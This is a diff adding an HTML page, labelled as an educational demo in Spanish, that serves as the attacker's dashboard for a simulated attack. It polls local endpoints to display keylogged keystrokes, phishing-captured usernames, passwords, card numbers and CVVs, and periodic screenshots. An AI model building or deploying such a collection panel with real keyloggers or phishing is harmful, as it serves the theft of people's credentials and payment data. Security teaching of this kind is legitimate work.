@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Panel del Atacante (DEMO)</title>
+    <style>
+        body { font-family: 'Consolas', monospace; background: #0a0a0a; color: #00ff41; margin: 0; padding: 20px; }
+        .banner { background: #de350b; color: white; padding: 10px; text-align: center; font-weight: bold; margin-bottom: 20px; }
+        h1 { color: #00ff41; border-bottom: 1px solid #00ff41; padding-bottom: 10px; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; }
+        .panel { background: #111; padding: 15px; border: 1px solid #00ff41; border-radius: 8px; height: 550px; overflow-y: auto; }
+        .panel h2 { color: #00ff41; margin-top: 0; font-size: 14px; border-bottom: 1px solid #00ff41; padding-bottom: 8px; }
+        .linea { padding: 4px 0; border-bottom: 1px solid #1a1a1a; font-size: 12px; }
+        .timestamp { color: #888; }
+        .ventana { color: #ffcc00; }
+        .tecla { color: #00ff41; font-weight: bold; }
+        .cred { background: #1a0000; padding: 8px; margin: 5px 0; border-left: 3px solid #ff0000; font-size: 13px; }
+        .creds-valor { color: #ff6b6b; font-weight: bold; }
+        #captura { width: 100%; border: 1px solid #00ff41; border-radius: 4px; }
+        #info-captura { color: #888; font-size: 11px; margin-top: 8px; }
+    </style>
+</head>
+<body>
+    <div class="banner">⚠️ PANEL DE DEMO — SIMULACIÓN EDUCATIVA ⚠️</div>
+    <h1>🔴 Panel del Atacante — Datos capturados en vivo</h1>
+
+    <div class="grid">
+        <div class="panel">
+            <h2>⌨️ Teclas capturadas por el keylogger</h2>
+            <div id="teclas"></div>
+        </div>
+        <div class="panel">
+            <h2>🔑 Credenciales capturadas por el phishing</h2>
+            <div id="credenciales"></div>
+        </div>
+        <div class="panel">
+            <h2>📸 Capturas de pantalla (cada 10s)</h2>
+            <img id="captura" src="" alt="Esperando captura...">
+            <p id="info-captura">Esperando primera captura...</p>
+        </div>
+    </div>
+
+    <script>
+        async function actualizarTeclas() {
+            try {
+                const r = await fetch('/teclas');
+                const teclas = await r.json();
+                document.getElementById('teclas').innerHTML = teclas.map(t =>
+                    `<div class="linea">
+                        <span class="timestamp">[${t.timestamp}]</span>
+                        <span class="ventana">[${t.ventana}]</span>
+                        <span class="tecla">${t.tecla}</span>
+                    </div>`
+                ).reverse().join('');
+            } catch(e) {}
+        }
+
+        async function actualizarCredenciales() {
+            try {
+                const r = await fetch('/credenciales');
+                const creds = await r.json();
+                document.getElementById('credenciales').innerHTML = creds.map(c =>
+                    `<div class="cred">
+                        <div class="timestamp">[${c.timestamp}] ${c.tipo}</div>
+                        <div>Usuario: <span class="creds-valor">${c.usuario}</span></div>
+                        <div>Password: <span class="creds-valor">${c.password}</span></div>
+                        ${c.tarjeta ? `<div>Tarjeta: <span class="creds-valor">${c.tarjeta}</span></div>` : ''}
+                        ${c.cvv ? `<div>CVV: <span class="creds-valor">${c.cvv}</span></div>` : ''}
+                    </div>`
+                ).reverse().join('');
+            } catch(e) {}
+        }
+
+        async function actualizarCaptura() {
+            try {
+                const r = await fetch('/ultima_captura');
+                const data = await r.json();
+                if (data.archivo) {
+                    document.getElementById('captura').src = '/screenshots/' + data.archivo + '?t=' + Date.now();
+                    document.getElementById('info-captura').textContent = 'Última: ' + data.archivo;
+                }
+            } catch(e) {}
+        }
+
+        setInterval(actualizarTeclas, 1000);
+        setInterval(actualizarCredenciales, 1000);
+        setInterval(actualizarCaptura, 3000);
+    </script>
+</body>
+</html>
